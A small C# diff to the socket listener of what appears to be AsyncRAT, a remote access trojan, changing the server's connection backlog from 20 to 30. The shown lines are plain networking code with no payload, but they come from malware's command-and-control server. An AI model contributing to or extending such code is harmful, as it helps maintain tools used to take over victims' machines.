@@ -24,7 +24,7 @@ namespace AsyncRAT_Sharp.Sockets
                     SendTimeout = -1,
                 };
                 Server.Bind(IpEndPoint);
-                Server.Listen(20);
+                Server.Listen(30);
                 HandleLogs.Addmsg($"Listenning {port}", Color.Green);
                 Server.BeginAccept(EndAccept, null);
             }
